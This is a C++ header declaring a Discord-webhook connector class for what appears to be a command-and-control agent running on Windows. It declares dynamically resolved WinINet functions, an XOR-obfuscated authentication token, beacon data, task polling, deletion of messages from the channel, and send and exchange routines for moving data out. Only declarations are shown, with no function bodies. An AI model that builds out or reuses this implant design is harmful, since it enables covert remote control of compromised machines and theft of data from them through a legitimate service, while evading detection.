#pragma once

#include <windows.h>
#include <wininet.h>
#include "AgentConfig.h"
#include "Connector.h"

#define DECL_API(x) decltype(x) * x

struct DISCORDFUNC {
	DECL_API(LocalAlloc);
	DECL_API(LocalReAlloc);
	DECL_API(LocalFree);
	DECL_API(LoadLibraryA);
	DECL_API(GetLastError);

	DECL_API(InternetOpenA);
	DECL_API(InternetConnectA);
	DECL_API(HttpOpenRequestA);
	DECL_API(HttpSendRequestA);
	DECL_API(InternetSetOptionA);
	DECL_API(InternetQueryOptionA);
	DECL_API(HttpQueryInfoA);
	DECL_API(InternetQueryDataAvailable);
	DECL_API(InternetCloseHandle);
	DECL_API(InternetReadFile);
};

class ConnectorDiscord : public Connector
{
	HINTERNET hSession;

	CHAR discordHost[128];
	CHAR webhookPath[512];
	CHAR tasksPath[256];
	CHAR authHeader[256];

	BYTE tokenXorKey[32];
	BYTE* tokenObf;
	ULONG tokenObfLen;

	BYTE* recvData;
	int   recvSize;

	ProfileDiscord profile;
	BYTE* beatData;
	ULONG beatSize;
	BOOL  beatSent;

	DISCORDFUNC* functions;

	BOOL  HttpsRequest(const CHAR* method, const CHAR* path, const CHAR* extraHeaders, BYTE* body, ULONG bodyLen, BYTE** outBuf, ULONG* outLen);
	void  ParseWebhookUrl(const CHAR* url);
	void  XorBuffer(BYTE* buf, ULONG len, BYTE* key, ULONG keyLen);
	CHAR* ExtractJsonString(const CHAR* json, ULONG jsonLen, const CHAR* key, ULONG* outLen);
	CHAR* ExtractJsonArray(const CHAR* json, ULONG jsonLen, ULONG* outLen);
	void  DeleteMessage(const CHAR* messageId);
	void  DeobfuscateToken(CHAR* out, ULONG outSize);
	void  PollTasks();

	BOOL SetConfig(ProfileDiscord prof, BYTE* beat, ULONG bSize);
	void SendData(BYTE* data, ULONG data_size);

public:
	ConnectorDiscord();

	BOOL SetProfile(void* profilePtr, BYTE* beat, ULONG beatSize) override;
	void Exchange(BYTE* plainData, ULONG plainSize, BYTE* sessionKey) override;
	BYTE* RecvData() override;
	int   RecvSize() override;
	void  RecvClear() override;
	void  CloseConnector() override;

	static void* operator new(size_t sz);
	static void operator delete(void* p) noexcept;
};
